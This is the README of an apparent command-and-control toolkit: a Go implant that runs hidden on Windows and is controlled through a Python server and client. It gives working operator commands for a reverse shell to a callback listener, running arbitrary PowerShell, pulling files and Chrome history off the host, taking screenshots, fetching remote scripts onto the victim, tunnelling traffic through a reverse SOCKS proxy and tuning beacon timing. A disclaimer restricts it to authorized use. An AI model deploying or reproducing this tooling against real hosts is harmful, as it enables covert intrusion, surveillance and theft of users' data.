# cc-agent
# Project Title: Agent 

## Overview

The agent is a comprehensive solution designed to facilitate remote command execution and management through a Go-based agent. This system allows for executing predefined or dynamic commands received from a server, with the capability to initiate a shell session for in-depth interaction. This README provides an overview of the project, including setup instructions, usage examples, and important security considerations.

## Features

- **Remote Command Execution**: Execute commands received from a centralized server.
- **Shell Capability**: Open a shell to a specified listener, allowing for interactive command execution.
- **Result Reporting**: Automatically sends the execution results of commands back to the server.
- **Hide Console Window**: Optionally runs without a visible console window to reduce footprint on the host system.
- **Download file on the remote host**: Download file from the host where the agent is running

## Installation

### Prerequisites

- Go (1.15 or newer)
- Python (3.6 or newer)
- Access to a server capable of hosting the Python-based command server

### Setup

1. **Clone the repository**:

```bash
   git clone https://github.com/JeanBonBeurre34/cc-agent.git
   cd cc-agent
```

2. **Build the agent**
Before building the agent you will need to replace in the code the serverUrl  with your endpoint configuration. TheserverURL is the endpoint of your server agent. You can use a dns name for both to faciliate ip rotation.
```go
var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
    bearerToken      = "Azerty112345678"
)

You need to change the bearerToken variable too. This variable is used to authenticate you on the server that control it.


```
Than you can build the agent.
```bash
go build -o go-agent.exe main.go
```

3. ** Start the agent server **
Change the default value for Bearer token inside the code (ugly) or pass it trough environment variable
```python
SERVER_TOKEN = os.getenv("SERVER_TOKEN", "Azerty112345678")
```
To pass your variable just use 
```bash 
export SERVER_TOKEN="Azerty112345678"
```
Ensure your Python environment is set up, then run:
```bash
python server.py
```
### Building with docker
To build the Go application using Docker, follow these steps:

1. Prepare the Dockerfile:
   Ensure the provided Dockerfile is placed in the root directory of your project. The Dockerfile includes instructions for building a Windows executable using cross-compilation.
2. Build the Docker Image:
Run the following command in your terminal to build the Docker image. This command builds the Go application as a Windows executable within a Docker container.
```bash
docker build -t agent-go .
```
3. Extract the Executable:
After building the image, extract the compiled Windows executable (myServiceAgent.exe) from the Docker container:
```bash
docker create --name temp-container agent-go
docker cp temp-container:/app/myServiceAgent.exe ./myServiceAgent.exe
docker rm temp-container
```
The exe binary will be copied on the local folder.

We automated most of the task in a single file for the unix fan: build.sh.
You just need to:
1. clone the repository locally
2. ensure to have docker up and running on the device with the Dockerfile available locally where you will be running the command
3. chmod the script: ```bash chmod +x build.sh```
4. run it ```bash ./build.sh```

## Executing Commands Remotely
You first need to setup the token variable. On linue just type the same value that the one for the agent/server for the Bearer token.
```bash
export AGENT_TOKEN="Azerty112345678"
```
Before to be able to send command to your agent your need to know which agent connected back to your server. The following command will output all the agent connected to your server:
```bash
python client.py --list-agents
```
That will display the agent unique uid name like under the agent ID:
```bash
[+] Using HTTP: http://192.168.56.101:5000
✅ 1 agent(s) connected:

• Agent ID: windows11-test0_63f53f570a475ae3
  IP: 192.168.56.10
  Last Seen: 2025-10-29T14:44:00.522092Z
```
You can than run all the command you want using the unique agent id.
The agent support the execution of remote command. You can execute the command and retrieve the result of the command.
Use the Python client to submit commands to the server:
```bash
python client.py --command "ipconfig /all" --agent-id "windows11-test0_63f53f570a475ae3"

```

To initiate a shell session, submit the special "shell" command:
Replace the ip after the shell with your call back ip the port can be changed too.
```bash
python client.py --command "shell 192.168.56.101:4444" --agent-id "windows11-test0_63f53f570a475ae3"

```

Ensure you have a listener running on the specified port before initiating the reverse shell:
```bash
nc -lvp 4444
```

## Collect agent command results
Before to be able to send command to your agent your need to know which agent connected back to your server. The following command will output all the agent connected to your server:
```bash
python client.py --list-agents
```
That will display the agent unique uid name like under the agent ID:
```bash
[+] Using HTTP: http://192.168.56.101:5000
✅ 1 agent(s) connected:

• Agent ID: windows11-test0_63f53f570a475ae3
  IP: 192.168.56.10
  Last Seen: 2025-10-29T14:44:00.522092Z
```
You can than run all the command you want using the unique agent id.
An id will be provided once a command has be run using the client. To retrieve the command results use the following command:
```bash
python client.py --get-results --agent-id "windows11-test0_63f53f570a475ae3" 
```

### Download file from the remote host
The agent support downloading file from the remote host.
To initiate a file to be downloaded just specify the path to the file on the remote host and the filename:
```bash
python client.py --command "download c:\Users\vboxuser\Desktop\document.docx document.docx" --agent-id "windows11-test0_63f53f570a475ae3" 
```
The file will be downloaded on the agent server and stored on inside a local folder named received_file.
To download file which does contain space on the path please use the following synthax
```bash
python client.py --command 'download "C:\Users\vboxuser\AppData\Local\Google\Chrome\User Data\Default\History" History' --agent-id "windows11-test0_63f53f570a475ae3"
```
### Take a screenshot on the remote host
The agent support taking a screenshot
To initiate take a screenshot just type:
```bash
python client.py --command "screenshot" --agent-id "windows11-test0_63f53f570a475ae3"
```
The file will be downloaded on the agent server and stored on inside a local folder named received_file.

### Run Powershell Command
The agent support to run powershell command
To run a powershell command type:
```bash
python client.py --command "powershell (Get-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload').PSObject.Properties" --agent-id "windows11-test0_63f53f570a475ae3"
```

### Run powershell script
The agent can run local powershell script on the remote host. The script should be already available on the remote host. You need to specify the script location on the host running the agent
```bash
python client.py --command "run_script C:\Users\user\Desktop\test-script.ps1"" --agent-id "windows11-test0_63f53f570a475ae3"
```
### Fetch file from remote url
This helper support downloading a file from a remote http server directly on the host
```bash
python client.py --command "fetchfile http://192.168.56.101/script.ps1 C:\Users\user\Desktop\test.ps1" --agent-id "windows11-test0_63f53f570a475ae3"
```
### Browser History
The agent support checking the browser history and location of the history. The following command will list the browser installed and the location of the history:
```bash
python client.py --command "browser_history" --agent-id "windows11-test0_63f53f570a475ae3"
```
Than you can download the browser history running the download option.

### Public Ip
The following command return the public ip where the agent is running calling ipinfo.
```bash
python client.py --command "publicip" --agent-id "windows11-test0_63f53f570a475ae3"
```

### Forward TCP proxy
You can start a reverse tcp proxy
```bash
python client.py --command "reverse_proxy_start"
```

To stop it just use this command
```bash
python client.py --command "reverse_proxy_stop"
```
By default the server.py will create two port 1080 to listen locally on locahost and 5555 to catch the incoming reverse tcp tunnel.
You need to update the proxychain config: /etc/proxychains.conf to add the following line
socks5 127.0.0.1 1080

### Beacon command retrieval interval
The following commond setup the beacon retrieval interval
```bash
python client.py --command "beacon min=5 max=10" --agent-id "windows11-test0_63f53f570a475ae3"
```

### Agent operation
The Go agent, once started, will periodically check the server for commands to execute. If the "shell" command is received, it will attempt to establish a shell connection to the listener address.

## Security Considerations
** Warning: ** This system allows for remote command execution, which carries significant security risks. Use it responsibly and only in environments where you have explicit authorization.
Recommendations:
        - Implement TLS for communication between the agent and the server.
        - Add authentication mechanisms to verify the identity of the command server and the agent.
        - Limit the network scope where possible to reduce exposure.
        - Regularly audit and monitor the system for unauthorized usage.

## Disclaimer and Liability
This project is provided for educational and research purposes only. It is not intended for malicious use or in any context where unauthorized access to computer systems is involved. The tools and techniques demonstrated can represent significant security risks; they should be used responsibly and only in legal and authorized contexts.

### Liability
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

By using this software, you acknowledge the potential impact it may have on systems and affirm that you have permission from relevant authorities or parties to use it in your context. The owner and contributors to this project assume no responsibility for unauthorized or illegal use of the tool, or for any damage caused by such use. It is the end user's responsibility to comply with all applicable local, state, national, and international laws.



### Build the go binary with visible windows not running in background only
Update the Dockerfile to remove the flag to hide the windows
```bash
RUN go build -o myServiceAgent.exe main.go
```
instead of 
```bash
RUN go build  -ldflags -H=windowsgui -o myServiceAgent.exe main.go
```
